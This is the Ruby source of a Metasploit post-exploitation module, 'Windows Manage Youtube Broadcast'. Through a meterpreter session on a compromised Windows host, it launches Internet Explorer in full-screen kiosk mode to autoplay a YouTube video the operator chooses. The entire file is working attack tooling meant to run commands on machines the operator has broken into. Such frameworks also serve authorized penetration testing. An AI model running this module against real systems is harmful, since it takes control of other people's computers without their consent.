##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Youtube Broadcast',
      'Description'   => %q{
        This module will broadcast a Youtube video on all compromised systems. It will play
        the video in the target machine's native browser in full screen mode. The VID datastore
        option is the "v" parameter in your Youtube video's URL.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sinn3r'],
      'Platform'      => [ 'win'],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('VID', [true, 'The video ID to the Youtube video'])
      ], self.class)
  end

  def peer
    "#{session.session_host}:#{session.session_port}"
  end

  def start_video(id)
    iexplore_path = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
    begin
      session.sys.process.execute(iexplore_path, "-k http://youtube.com/embed/#{id}?autoplay=1")
    rescue Rex::Post::Meterpreter::RequestError => e
      return false
    end

    true
  end

  def run
    id = datastore['VID']

    print_status("#{peer} - Spawning video...")
    if start_video(id)
      print_good("#{peer} - The video has started")
    else
      print_error("#{peer} - Unable to start the video")
      return
    end

  end

end
